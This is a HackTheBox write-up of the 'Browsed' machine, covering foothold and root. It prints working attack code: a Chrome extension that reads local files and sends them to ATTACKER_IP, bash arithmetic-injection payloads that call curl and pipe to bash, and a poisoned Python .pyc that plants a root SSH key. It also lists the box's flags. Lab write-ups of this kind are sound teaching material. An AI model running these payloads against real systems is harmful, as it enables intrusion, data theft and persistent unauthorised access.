# Browsed — Writeup
> HackTheBox | Medium | 2026-03-26

## Summary

Browsed is a Linux box running a Chrome extension review platform. A malicious Manifest V3 extension is used to enumerate internal services from Chrome's context, revealing a Gitea instance and an internal Flask application. The Flask app passes user input to a bash script that uses `[[ "$1" -eq 0 ]]` — exploitable through bash arithmetic evaluation to achieve RCE as `larry`. Privilege escalation abuses a world-writable `__pycache__` directory to poison a Python `.pyc` module loaded by a sudo-permitted script, gaining root.

## Reconnaissance

A full TCP scan reveals a minimal attack surface:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

The web application at port 80 is a company called "Browsed" (`browsed.htb`) that develops Chrome extensions. WhatWeb confirms nginx/1.24.0 serving static HTML5 with jQuery.

## Enumeration

The site has three interesting pages:

- **`/`** — Landing page. States the company accepts Chrome version 134 extensions, uploaded as `.zip` files with contents directly in the archive root (no subfolder).
- **`/samples.html`** — Three sample extensions available for download: Fontify, ReplaceImages, Timer. Downloading Fontify reveals the expected format: Manifest V3 with `content_scripts` on `<all_urls>`.
- **`/upload.php`** — Upload form (`name="extension"`, `accept=".zip"`). After upload, a JavaScript `pollOutput()` function fetches results from `upload.php?output=1`. The page says: *"A developer will use it and reach back with some feedback."*

This tells us that uploaded extensions are loaded into a real Chrome instance on the server, and console output is captured and returned.

## Foothold

### Phase 1: Malicious Chrome Extension as Recon Tool

The first malicious extension used a Manifest V3 background service worker that fires `chrome.runtime.onInstalled`. On the initial upload, the server's HTTP response leaked the Chrome command line:

```
timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
  --load-extension="/tmp/extension_..." \
  --enable-logging=stderr --v=1 \
  http://localhost/ http://browsedinternals.htb
```

Key observations:
- Chrome runs headless with `--no-sandbox`
- It navigates to `http://localhost/` and **`http://browsedinternals.htb`** — an internal vhost
- Console output is captured via `--enable-logging=stderr --v=1`
- Extensions run as `www-data` (Chrome cache at `/var/www/.cache/google-chrome-for-testing/`)
- Process has a 10-second timeout

Chrome's verbose logging truncates `console.log()` output, so network exfiltration was used instead — the background service worker POSTed data to a Python HTTP listener on the attack box:

```javascript
async function exfil(label, data) {
  try {
    await fetch("http://ATTACKER_IP:9999/" + encodeURIComponent(label), {
      method: "POST",
      body: data
    });
  } catch(e) {}
}

chrome.runtime.onInstalled.addListener(async () => {
  // Read local files via file:// protocol
  const r = await fetch("file:///etc/passwd");
  await exfil("passwd", await r.text());

  // Enumerate internal services
  const r2 = await fetch("http://127.0.0.1:3000/api/v1/repos/search?limit=50");
  await exfil("repos", await r2.text());
  // ...
});
```

The extension's service worker, running in Chrome with `--no-sandbox`, can read local files via `file://` URLs and access internal services. This revealed:

| Finding | Detail |
|---------|--------|
| `/etc/passwd` | User `larry` (uid 1000) has shell access |
| `127.0.0.1:3000` | **Gitea 1.24.5** instance (`browsedinternals.htb`) |
| `127.0.0.1:5000` | **Flask** application (Markdown Previewer) |
| Gitea user | `larry` — single user, one public repo |
| Gitea repo | `larry/MarkdownPreview` — Python Flask app |

### Phase 2: Source Code Exfiltration

The extension fetched repo contents via Gitea's API (`/api/v1/repos/larry/MarkdownPreview/raw/{file}?ref=main`), revealing:

**app.py** — Flask app on port 5000 (localhost only):

```python
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

**routines.sh** — Bash script with arithmetic comparisons:

```bash
if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  ...
elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  ...
fi
```

### Phase 3: Bash Arithmetic Evaluation RCE

The vulnerability is in bash's `[[ "$1" -eq 0 ]]` construct. The bash manual states:

> When used with the `[[` command, [arithmetic binary operator] Arg1 and Arg2 are evaluated as arithmetic expressions (see ARITHMETIC EVALUATION below).

In bash's arithmetic evaluation, array subscript expressions are recursively evaluated, including command substitutions. This means a payload like `a[$(command)]` passed as `$1` will be interpreted as: variable `a` with subscript `$(command)` — and the `$(command)` is executed.

The `subprocess.run(["./routines.sh", rid])` call uses list form (no `shell=True`), which safely passes `rid` as a single argument — but bash's own arithmetic evaluator re-interprets it.

**Constraint:** The payload travels through a Flask URL path (`/routines/<rid>`). Flask decodes `%2F` to `/`, splitting the path into multiple segments that don't match the route. The payload must not contain forward slashes.

**Proof of concept:**

```
Payload:  a[$(curl ATTACKER_IP:9999)]
URL:      http://127.0.0.1:5000/routines/a%5B%24%28curl%20ATTACKER_IP%3A9999%29%5D
```

URL encoding:
- `[` = `%5B`, `]` = `%5D`
- `$` = `%24`
- `(` = `%28`, `)` = `%29`

The first test confirmed RCE: the target connected to the listener. The second test piped `id` output back via `a[$(id|curl -d @- ATTACKER_IP:9999)]`.

**SSH key plant — two-step delivery:**

Since `curl ATTACKER_IP:9999|bash` contains no slashes, the pipe-to-bash approach works. The listener serves a shell script on any GET request:

```bash
#!/bin/bash
mkdir -p $HOME/.ssh
echo 'ssh-ed25519 AAAA...' >> $HOME/.ssh/authorized_keys
chmod 700 $HOME/.ssh
chmod 600 $HOME/.ssh/authorized_keys
```

The extension triggers the Flask endpoint:

```javascript
// Download and execute in two separate calls
fetch("http://127.0.0.1:5000/routines/a%5B%24%28curl%20-o%20.x.sh%2010.10.14.91%3A9999%29%5D");
fetch("http://127.0.0.1:5000/routines/a%5B%24%28bash%20.x.sh%29%5D");
```

```
$ ssh -i browsed_key larry@10.129.244.79
$ id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```

## Privilege Escalation: Root

### Enumeration

```
$ sudo -l
User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

The script is a Python 3.12 tool for managing Chrome extensions. It imports a local module:

```python
#!/usr/bin/python3.12
from extension_utils import validate_manifest, clean_temp_files
```

Directory permissions:

```
drwxr-xr-x  /opt/extensiontool/
-rwxrwxr-x  extension_tool.py      (root:root)
-rw-rw-r--  extension_utils.py     (root:root)
drwxrwxrwx  __pycache__/           (root:root)  ← WORLD-WRITABLE
```

Larry cannot modify the source files (root:root, not in root group), but `__pycache__` is world-writable and currently empty.

### Python .pyc Cache Poisoning

Python caches compiled bytecode in `__pycache__/`. When importing a module, Python checks if a valid `.pyc` file exists with a timestamp matching the source file's mtime. If it matches, Python loads the cached bytecode directly — skipping the source file entirely.

The `.pyc` header format (Python 3.8+):

| Offset | Size | Field |
|--------|------|-------|
| 0 | 4 | Magic number (`0xcb0d0d0a` for Python 3.12) |
| 4 | 4 | Flags (`0` = timestamp-based invalidation) |
| 8 | 4 | Source mtime (little-endian uint32) |
| 12 | 4 | Source size (little-endian uint32) |
| 16 | ... | Marshaled code object |

From `stat extension_utils.py`:
- **mtime:** `2025-03-23 10:56:19 UTC` (epoch `1742727379`)
- **size:** `1245` bytes

The malicious module plants an SSH key for root while still providing the expected `validate_manifest()` and `clean_temp_files()` functions so the tool runs cleanly:

```python
import os, subprocess

pubkey = "ssh-ed25519 AAAA..."
os.makedirs("/root/.ssh", mode=0o700, exist_ok=True)
with open("/root/.ssh/authorized_keys", "a") as f:
    f.write(pubkey + "\n")
os.chmod("/root/.ssh/authorized_keys", 0o600)

# Provide expected functions so the tool doesn't crash
import json, shutil
from jsonschema import validate, ValidationError

def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    validate(instance=data, schema=MANIFEST_SCHEMA)
    print("[+] Manifest is valid.")
    return data

def clean_temp_files(extension_dir):
    # ... original implementation ...
```

**Critical detail:** The `.pyc` must be compiled on the target with the target's Python 3.12.3 to produce a compatible marshaled code object. Compiling locally with a different Python version caused a segfault.

```bash
# On the target as larry:
larry$ python3.12 /tmp/gen_pyc.py
[+] Written 2448 bytes to /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc

larry$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
[+] Manifest is valid.
[-] Skipping version bumping
[-] Skipping packaging
```

Python loaded the poisoned `.pyc`, executing the SSH key plant as root:

```
$ ssh -i browsed_key root@10.129.244.79
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Flags

```
user.txt: 18743a6a8c6e560846782d46205fdc5e
root.txt: 1f036d0839072a19df5af0397076e460
```

## Key Takeaways

1. **Chrome extensions are full recon platforms.** A Manifest V3 service worker with `--no-sandbox` Chrome can read local files via `file://`, access internal services, and exfiltrate data via `fetch()`. Any system that loads untrusted extensions is an attack surface.

2. **Bash `[[ -eq ]]` is not safe for untrusted input.** Unlike `[ -eq ]`, the `[[ ]]` compound command evaluates operands as arithmetic expressions, which recursively resolve variables and execute command substitutions in array subscripts (`a[$(cmd)]`).

3. **URL path constraints shape payloads.** Flask decodes `%2F` as a path separator, so payloads routed through URL paths cannot contain forward slashes. Designing payloads around this constraint (e.g., `curl host:port|bash` instead of `curl http://host:port/path`) is a practical skill.

4. **Python `.pyc` cache poisoning is viable when `__pycache__` is writable.** The timestamp-based invalidation mechanism trusts the mtime embedded in the `.pyc` header. If it matches the source file's mtime, the bytecode is loaded without verifying content integrity. World-writable `__pycache__` directories are a privilege escalation vector.

5. **Compile `.pyc` files on the target.** Python's marshal format varies between minor versions. A `.pyc` compiled with Python 3.11 will segfault when loaded by Python 3.12. Always compile on the target or match the exact Python version.
